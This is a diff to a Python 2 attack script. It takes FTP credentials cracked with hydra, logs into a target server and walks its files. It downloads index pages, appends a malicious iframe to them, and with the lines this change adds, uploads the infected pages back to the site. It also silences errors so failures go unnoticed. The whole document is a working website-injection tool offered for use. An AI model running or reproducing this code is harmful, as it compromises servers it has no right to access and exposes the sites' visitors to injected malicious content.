@@ -15,11 +15,9 @@ import ipaddr
 import nmapxml
 from nmapxml import *
 import ftputil
-import ftplib
 
 parser = argparse.ArgumentParser(description='Scan for FTP websites using creds discovered with hydra, search for index files append malicous code into it, then upload it back')
 parser.add_argument('-ip', action='store', required=True, help='IP Address to be assessed')
-parser.add_argument('-n', action='store_false', required=false, help='Inject malicious code')
 
 args = parser.parse_args()
 try:
@@ -35,9 +33,10 @@ def ftpLogin(ip_address, u, p):
                 ftp = ftputil.FTPHost(ip_address, u, p)
                 print "[+] %s - FTP using %s/%s is Permitted" % (ip_address, u, p)
                 return(ftp)
-        except OSError:
-                print "[-] %s - FTP using %s/%s is not allowed" % (ip_address, u, p)
+        except OSError as error:
+                print "[-] %s - FTP using creds %s:%s is not allowed" % (ip_address, u, p)
                 pass 
+		return
 
 def injectPage(fname):
 	try:
@@ -45,8 +44,6 @@ def injectPage(fname):
 		f = open(("%s" % fname), 'a')
     		f.write(reconf.iframe1)	
 		f.close()
-	except Exception, e:
-		print e
 	finally:
 		pass
 
@@ -69,37 +66,45 @@ finally:
 	print "\033[1;31m [!] \033[0;m Brute force of %s is completed." % (ip_address)
 	pass
 	
-
 try:
 	fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
 	print "\033[1;31m [!] \033[0;m Parsing %s for creds" % (fnmap)
+	seenusrpwd = set() 
 	with open(fnmap, 'r') as searchfile:
 		for line in searchfile:
 			if 'login:' in line and 'password:' in line:
 				u = re.split('\s+', line)[4].strip()
 				p = re.split('\s+', line)[6].strip()
-				ftp = ftpLogin(ip_address, u, p)
-				recursive = ftp.walk("/",topdown=True,onerror=None)
-				for root,dirs,files in recursive:
-					for dlst in dirs:
-						results = "%s\n" % dlst
-						if dlst != "":
-							#f.write(results)
-							print results
-					for fname in files:
-						results = "%s/%s\n" % (root, fname)
-						if fname != "":
-							#f.write(results)
-							print results
-						if re.search(r'^(index)[.](htm|html|asp|php)', fname):
-							print "[+] Found default page %s at %s" % (fname, root)
-							try:
-								print "Downloading %s with U %s P %s" % (fname, u, p)
-								ftp.download(("%s/%s" % (root, fname)), fname)
-								injectPage(fname)
-							except Exception, e:
-								print e
-except Exception, e: 
+				usrpwd = "%s:%s" % (u, p)
+				if usrpwd not in seenusrpwd:	
+					print "\033[1;31m [!] \033[0;m Using %s creds to FTP into %s" % (usrpwd, ip_address)
+					seenusrpwd.add(usrpwd)
+					ftp = ftpLogin(ip_address, u, p)
+					try:
+						recursive = ftp.walk("/",topdown=True,onerror=None)
+						for root,dirs,files in recursive:
+							for dlst in dirs:
+								results = "%s\n" % dlst
+								if dlst != "":
+									#f.write(results)
+									print results
+							for fname in files:
+								results = "%s/%s\n" % (root, fname)
+								if fname != "":
+									#f.write(results)
+									print results
+								if re.search(r'^(index)[.](htm|html|asp|php)', fname):
+									print "[+] Found default page %s at %s" % (fname, root)
+									try:
+										print "Downloading %s with U %s P %s" % (fname, u, p)
+										ftp.download(("%s/%s" % (root, fname)), fname)
+										injectPage(fname)
+										ftp.upload_if_newer(fname, ("%s/%s" % (root, fname)))
+									except:
+										pass
+					except:
+						pass
+except: 
 	pass
 finally:
 	print "\033[1;31m [!] \033[0;m Assessment Complete."
